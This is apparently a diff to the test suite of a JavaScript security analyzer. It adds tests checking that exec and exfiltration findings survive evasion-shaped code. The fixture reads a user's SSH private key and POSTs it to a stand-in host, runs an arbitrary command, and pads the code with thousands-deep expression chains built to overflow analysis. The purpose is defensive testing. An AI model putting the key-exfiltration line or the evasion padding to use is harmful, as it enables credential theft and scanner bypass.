@@ -89,7 +89,7 @@ describe('parser-overflow evasion shapes (dt13 RG1)', () => {
       const flows = analyzeCode(code, `${name}.js`);
       expect(flows.some(f => f.type === 'eval-exec'), 'exec found').toBe(true);
       expect(flows.some(f => f.type === 'source-to-sink'), 'exfiltration found').toBe(true);
-      expect(analysisEvasion(code, `${name}.js`)).toBeGreaterThan(0);
+      expect(analysisEvasion(code, `${name}.js`)?.line).toBeGreaterThan(0);
     });
   }
 
@@ -103,5 +103,33 @@ describe('parser-overflow evasion shapes (dt13 RG1)', () => {
     const code = 'a("x;y");\nb(`${c;}` ,[1;2]);\nd()';
     expect(topLevelSegments(code).map(s => code.slice(s.start, s.end).trim()).filter(Boolean))
       .toEqual(['a("x;y");', 'b(`${c;}` ,[1;2]);', 'd()']);
+  });
+});
+
+describe('traverse-overflow shapes (dt13 perf2)', () => {
+  const head = 'const cp=require("child_process");\nconst fs=require("fs");\nconst k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa","utf8");\nfetch("https://collect.example.net/u",{method:"POST",body:k});\ncp.exec(process.argv[2]);\n';
+  const n = 4000;
+  const shapes: Record<string, string> = {
+    'binary chain': `var p=${Array(n).fill('1').join('+')};\n`,
+    'call chain': `var p=a${'()'.repeat(n)};\n`,
+    'member chain': `var p=a${'.b'.repeat(n)};\n`,
+    'arrow chain': `var p=${'x=>'.repeat(n / 4)}1;\n`,
+    'ternary chain': `var p=${'a?b:'.repeat(n)}c;\n`,
+    'if chain': `${'if(a)'.repeat(n)}x();\n`,
+  };
+  for (const [name, tail] of Object.entries(shapes)) {
+    it(`keeps exec and exfiltration findings: ${name}`, () => {
+      const flows = analyzeCode(head + tail, `perf2-${name}.js`);
+      expect(flows.some(f => f.type === 'eval-exec'), 'exec').toBe(true);
+      expect(flows.some(f => f.type === 'source-to-sink'), 'exfiltration').toBe(true);
+    });
+  }
+
+  it('line fallback finds exec and a send carrying file data when no AST exists', async () => {
+    const { lineFallback } = await import('./ast-analyzer.js');
+    const flows = lineFallback(head);
+    expect(flows.some(f => f.type === 'eval-exec' && f.line === 5)).toBe(true);
+    expect(flows.some(f => f.type === 'source-to-sink' && f.line === 4 && f.source === 'k')).toBe(true);
+    expect(lineFallback('const a = 1;\nconsole.log(a);\n')).toEqual([]);
   });
 });
